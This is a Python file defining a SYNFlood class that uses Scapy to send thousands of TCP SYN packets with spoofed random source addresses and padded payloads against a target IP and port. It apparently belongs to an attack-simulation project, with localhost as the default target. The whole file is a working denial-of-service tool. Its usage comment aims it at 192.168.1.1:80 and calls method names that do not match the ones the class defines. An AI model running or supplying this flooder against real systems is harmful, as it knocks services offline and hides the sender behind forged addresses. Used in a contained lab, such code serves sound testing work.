# Import required libraries
from scapy.all import IP, TCP, Raw, RandShort, send  # Scapy for packet crafting and sending
from random import randint  # For generating random IP addresses
import time  # For implementing delays between packets
from logs.logger import setupLogger  # Custom logging setup
from threading import Event  # For implementing stop mechanism

# Initialize logger for this module
logger = setupLogger(__name__)

class SYNFlood:
    
     #works by sending multiple SYN packets to overwhelm the target's TCP connection queue.
    
    def __init__(self, target_ip='127.0.0.1', target_port=5001):
        
        self.target_ip = target_ip
        self.target_port = target_port
        self.packet_count = 10000  
        self.delay = 0.1  
        # how to stop the attack
        self.stop_event = Event()  
        self.sent_count = 0  

    def configureAttack(self, packet_count=None, delay=None):
        
        if packet_count: self.packet_count = packet_count
        if delay: self.delay = delay

    def startAttack(self):
        """
        Sends multiple TCP SYN packets to the target with:
        - Randomised source addresses
        - Random source ports
        - SYN flag set
        """
        self.sent_count = 0
        
        logger.info(f"Starting SYN flood attack on {self.target_ip}:{self.target_port}")
        
        try:
            for i in range(self.packet_count):

                if self.stop_event.is_set():
                    logger.info("Attack stopped by user")
                    break
                    
                # random source IP to spoof packets
                src_ip = f"{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}"
                
                # Craft the  packet
                packet = (
                    # IP layer with spoofed source
                    IP(src=src_ip, dst=self.target_ip) /  
                    # TCP layer with SYN flag
                    TCP(sport=RandShort(), dport=self.target_port, flags="S", seq=RandShort()) /  
                    # Add payload to make packet larger
                    Raw(b"X" * 1024)  
                )
                
                try:
                    # send is used to transmit the packet
                    # verbose tells scapy to suppress output and not show any details about the packet
                    # just means it doesn't flood the console with output
                    send(packet, verbose=0)  
                except Exception as e:
                    logger.error(f"Packet sending failed: {str(e)}")
                
                self.sent_count += 1
                
                # Log progress every 100 packets
                # Might change the output number to avoid flooding the logs
                if self.sent_count % 100 == 0:
                    logger.info(f"Progress: {self.sent_count}/{self.packet_count} packets")
                
                # Implement delay if specified
                if self.delay > 0:
                    time.sleep(self.delay)
        
        except KeyboardInterrupt:
            logger.info("Attack interrupted by user")
        
        finally:
            logger.info(f"Attack completed. Sent {self.sent_count} packets")
            return self.sent_count

    def stopAttack(self):
        
        self.stop_event.set()

# Usage example:
# flood = SYNFlood(target_ip="192.168.1.1", target_port=80)
# flood.configure_attack(packet_count=1000, delay=0.01)
# flood.start_attack()